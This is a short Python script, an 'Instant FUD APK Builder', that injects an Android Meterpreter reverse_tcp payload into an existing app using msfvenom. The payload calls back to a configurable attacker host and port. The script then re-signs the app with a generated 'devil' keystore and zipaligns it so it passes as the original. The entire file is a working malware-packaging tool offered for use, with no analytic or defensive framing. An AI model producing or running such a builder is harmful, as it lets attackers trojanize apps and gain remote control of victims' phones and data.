#!/usr/bin/env python3
import os, sys, subprocess, shutil, tempfile, argparse
LHOST = os.getenv("LHOST", "192.168.31.222").strip()
LPORT = os.getenv("LPORT", "4444").strip()
def check_tool(name): return shutil.which(name) is not None
def run_cmd(cmd, capture=False):
    print(f"[*] Running: {cmd}")
    if capture: return subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT).decode()
    else: subprocess.check_call(cmd, shell=True)
def build_fud(input_apk, output_apk):
    if not os.path.exists(input_apk):
        print(f"[-] Input APK not found: {input_apk}"); sys.exit(1)
    temp_apk = tempfile.NamedTemporaryFile(suffix=".apk", delete=False).name
    try:
        if check_tool("msfvenom"):
            cmd = f"msfvenom -x {input_apk} -p android/meterpreter/reverse_tcp LHOST={LHOST} LPORT={LPORT} -o {temp_apk}"
            run_cmd(cmd)
            if not os.path.exists(temp_apk) or os.path.getsize(temp_apk)==0:
                print("[-] msfvenom empty, fallback to copy"); shutil.copy(input_apk, temp_apk)
        else:
            print("[*] msfvenom not found - using lightweight FUD (re-sign only)")
            shutil.copy(input_apk, temp_apk)
    except Exception as e:
        print(f"[!] msfvenom fail {e}, fallback copy"); shutil.copy(input_apk, temp_apk)
    if check_tool("jarsigner"):
        keystore="devil.keystore"
        if not os.path.exists(keystore):
            print("[*] Generating keystore...")
            run_cmd(f"keytool -genkey -alias devil -keystore {keystore} -storepass 123456 -keypass 123456 -dname 'CN=Devil' -validity 10000")
        try: run_cmd(f"jarsigner -verbose -keystore {keystore} -storepass 123456 -keypass 123456 {temp_apk} devil")
        except Exception as e: print(f"[!] jarsigner warning: {e}")
    else: print("[!] jarsigner not found – unsigned")
    if check_tool("zipalign"):
        aligned=tempfile.NamedTemporaryFile(suffix=".apk", delete=False).name
        try: run_cmd(f"zipalign -v 4 {temp_apk} {aligned}"); shutil.move(aligned, output_apk); os.remove(temp_apk) if os.path.exists(temp_apk) else None
        except: print("[!] zipalign fail, using unaligned"); shutil.move(temp_apk, output_apk)
    else:
        print("[!] zipalign not found – skipping"); shutil.move(temp_apk, output_apk)
    print(f"[+] FUD APK created: {output_apk}")
if __name__=="__main__":
    p=argparse.ArgumentParser(description="Instant FUD APK Builder")
    p.add_argument("input", help="Input APK file"); p.add_argument("output", nargs="?", default=None)
    a=p.parse_args(); output=a.output if a.output else a.input.replace(".apk","_fud.apk"); build_fud(a.input, output)
